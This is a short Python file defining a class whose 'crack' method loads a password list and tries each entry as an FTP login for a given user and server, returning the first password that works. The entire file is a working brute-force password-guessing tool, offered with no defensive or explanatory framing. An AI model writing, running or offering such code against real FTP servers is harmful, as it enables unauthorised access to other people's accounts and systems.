from ftplib import *
import getpass

class ftp:
    def __init__(self, pl, ip='127.0.0.1', port=21, username=getpass.getuser(), **kwargs):
        self.ip = ip
        self.port = port
        self.username = username
        self.pl = open(pl, 'r').read()

    def crack(self):
        ftp = FTP()
        ftp.connect(self.ip, self.port)
        for i in self.pl.split():
            try:
                ftp.login(self.username, i)
                return i
            except:
                pass
        ftp.close()
